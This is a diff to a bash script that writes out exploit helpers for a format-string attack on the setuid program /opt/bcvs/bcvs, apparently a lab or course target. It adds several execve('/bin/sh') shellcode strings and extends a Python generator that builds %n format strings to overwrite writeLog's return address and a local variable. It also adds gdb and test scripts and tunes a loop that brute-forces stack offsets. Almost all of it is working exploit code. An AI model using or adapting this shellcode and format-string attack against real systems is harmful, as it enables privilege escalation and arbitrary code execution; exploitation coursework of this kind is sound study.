@@ -32,6 +32,12 @@ shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"
 shellcode2 = "\x6A\x68\x68\x2F\x62\x61\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2"
 shellcode2 += "\x52\x53\x89\xE1\x6A\x0B\x58\xCD\x80"
 
+shellcode3 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+shellcode3 += "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+shellcode4 = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+shellcode4 += "\x6e\x89\xe3\x31\xc9\xcd\x80"
+
 
 if __name__ == '__main__':
   if len(sys.argv) > 1:
@@ -45,7 +51,7 @@ if __name__ == '__main__':
 
   full_shellcode = NOP * (bsize - len(shellcode) - 1)
   full_shellcode += shellcode
-  print(full_shellcode)
+  sys.stdout.write(full_shellcode)
   sys.exit(0)
 EOS
 
@@ -80,7 +86,7 @@ def hasTermByte(addr):
 
   return False
 
-def fillInitialAddress(fstr, addr,  direction=1):
+def fillInitialAddress(fstr, addr,  direction=1, overwrite_ts=False):
 
   # Create a list of addresses, incremented by 'direction'
   addr_list = [hexify(addr+(direction*i))[::-1] for i in range(4)]
@@ -90,6 +96,13 @@ def fillInitialAddress(fstr, addr,  direction=1):
     # aligned to a 16 byte boundary not ending with 00 then we shouldn't
     # have problems
     fstr += a
+
+  if overwrite_ts:
+    ## Then we have to add the addresses to overwrite the tempString
+    ## local variable
+    ts_addrs = [hexify(addr-20+(direction*i))[::-1] for i in range(4)]
+    for a in ts_addrs:
+      fstr += a
 
   # This is just to pad for changes in stack addresses
   fstr *= $RPTR_REPEAT
@@ -115,7 +128,7 @@ def findRequiredOffset(targetByte, cWritten):
 
   return diff
 
-def fillReturnPointerValue(fstr, targetRetAddr, offset):
+def fillReturnPointerValue(fstr, targetRetAddr, offset, overwrite_ts=False):
   # This is the address in memory that the fprintf attack ultimately
   # wants to make writeLog return to. The addresses to write this address
   # to have already been setup we just need to create the correct
@@ -143,6 +156,13 @@ def fillReturnPointerValue(fstr, targetRetAddr, offset):
     written += diff
     dpa_offset += 1
 
+  if overwrite_ts:
+    for i in range(4):
+      diff = findRequiredOffset('\x00', written)
+      fstr += "%{}x%{}\$n".format(diff, dpa_offset);
+      written += diff
+      dpa_offset += 1
+
   # The format string should be all done and ready to go
   return fstr
 
@@ -164,10 +184,17 @@ if __name__ == '__main__':
 
   rptr_offset = 0
   printf_offset = 0
+  overwrite_ts = False
+
   if len(sys.argv) > 3:
     rptr_offset = int(sys.argv[3])
   if len(sys.argv) > 4:
     printf_offset = int(sys.argv[4])
+  if len(sys.argv) > 5:
+    if sys.argv[5] in ("1", "true", "True"):
+      overwrite_ts = True
+    else:
+      overwrite_ts = False
 
   # Some input checking
   sys.argv[1] = padByteString(sys.argv[1])
@@ -196,10 +223,11 @@ if __name__ == '__main__':
   init_fprintf_offset += printf_offset * 4
 
   format_str = ""
-  format_str = fillInitialAddress(format_str, rptr_addr_int, 1)
-  format_str = fillReturnPointerValue(format_str, rptr_val, init_fprintf_offset)
+  format_str = fillInitialAddress(format_str, rptr_addr_int, 1, overwrite_ts)
+  format_str = fillReturnPointerValue(format_str, rptr_val, init_fprintf_offset, overwrite_ts)
 
-  print("{}".format(format_str))
+  #print("{}".format(format_str))
+  sys.stdout.write(format_str)
   sys.exit(0)
 EOS
 
@@ -212,11 +240,12 @@ EOS
 
 cat <<EOS > "run_w_gdb.sh"
 #!/bin/bash
+WL_FRAME_ADDR_GUESS="bffff55C"
 ATTACK_JMP_ADDR="804C328"
-FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
+FORMAT_ADDRS_LEN=$(( 2 + 32 * $RPTR_REPEAT ))
 
 SHELLCODE=\$(./payload.py 300 2)
-FORMAT_STR=\$(./gen_fmt_str.py bffff60C \$ATTACK_JMP_ADDR)
+FORMAT_STR=\$(./gen_fmt_str.py \$WL_FRAME_ADDR_GUESS \$ATTACK_JMP_ADDR 0 0 1)
 FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
 FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
 echo "Shellcode: \$SHELLCODE"
@@ -224,14 +253,37 @@ echo "Format String: \$FORMAT_STR"
 
 touch temp_file_gdb
 
+echo "Format Strin (Hex):"
+echo -n "\$FORMAT_STR" | hexdump -C
+
 echo "\${FORMAT_DIRS}\${SHELLCODE}" > format_str
 gdb -ex "set args ci \"\$FORMAT_ADDRS\" < format_str" /opt/bcvs/bcvs
+EOS
+
+cat <<EOS > "test_generate.sh"
+ATTACK_JMP_ADDR="804C328"
+FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
+OW_TS="0"
+
+echo "ATTACK_JMP_ADDR: \$ATTACK_JMP_ADDR"
+echo "FORMAT_ADDRS_LEN: \$FORMAT_ADDRS_LEN"
+if [[ \$# -eq 1 ]]; then
+  OW_TS=\$1
+  echo "Overwrite tempString: \$OW_TS"
+fi
+SHELLCODE=\$(./payload.py 300 2)
+FORMAT_STR=\$(./gen_fmt_str.py bffff60C \$ATTACK_JMP_ADDR 0 0 \$OW_TS)
+FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
+FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
+echo "Shellcode: \$SHELLCODE"
+echo -n "\$FORMAT_STR" | hexdump -C
 EOS
 
 chmod +x payload.py
 chmod +x gen_fmt_str.py
 chmod +x rerun_sploit.sh
 chmod +x run_w_gdb.sh
+chmod +x test_generate.sh
 
 if [[ $# -gt 0 && $1 == "-s" ]]; then
   # This way we can update the scripts without running the exploit
@@ -239,7 +291,7 @@ if [[ $# -gt 0 && $1 == "-s" ]]; then
   exit 0
 fi
 
-SHELLCODE=`./payload.py 300 2`
+SHELLCODE=`./payload.py 300 4`
 
 if [[ $? == -1 ]]; then
   echo "failed to generate shellcode"
@@ -250,24 +302,24 @@ echo "Created shellcode of length: ${#SHELLCODE}"
 touch temp_file
 
 OFFSET=0
-RET_PTR_LOC="bffff63C"  # The frame for writeLog shouldn't come before this
+RET_PTR_LOC="bffff57C"  # The frame for writeLog shouldn't come before this
 ATTACK_JMP_ADDR="804C328"
 
 # Now that we store the address part of the format string on the stack in main
 # this is no longer necessary
 HEAP_PTR="804c2d8" # Given we don't have ASLR enabled this seems to be consistent
 
-FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
+FORMAT_ADDRS_LEN=$(( 2 + 32 * $RPTR_REPEAT ))
 echo "Format address length: $FORMAT_ADDRS_LEN"
 
 # Now we brute force it. Hopefully if our initial guess isn't too far off we
 # should get it soon.
-while [[ $OFFSET -lt 50 ]]; do
+while [[ $OFFSET -lt 25 ]]; do
   _OFFSET=$(( $OFFSET * 16 ))
-  PRINTF_OFFSET=-10
-  while [[ $PRINTF_OFFSET -lt 10 ]]; do
+  PRINTF_OFFSET=-2
+  while [[ $PRINTF_OFFSET -lt 4 ]]; do
     echo "Generating format string [base,rptr_offset,printf_offset]: [$RET_PTR_LOC,$_OFFSET,$PRINTF_OFFSET]"
-    FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET`
+    FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET 1`
     FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
     FORMAT_DIRS=${FORMAT_STR:$FORMAT_ADDRS_LEN}  # These are the format directives
 
@@ -277,7 +329,7 @@ while [[ $OFFSET -lt 50 ]]; do
     fi
 
     echo "Format String (hex):"
-    echo  $FORMAT_STR | hexdump -C
+    echo  -n "$FORMAT_STR" | hexdump -C
 
     echo "Format String Addrs: ${FORMAT_ADDRS}"
     echo "Format Directives: ${FORMAT_DIRS}"
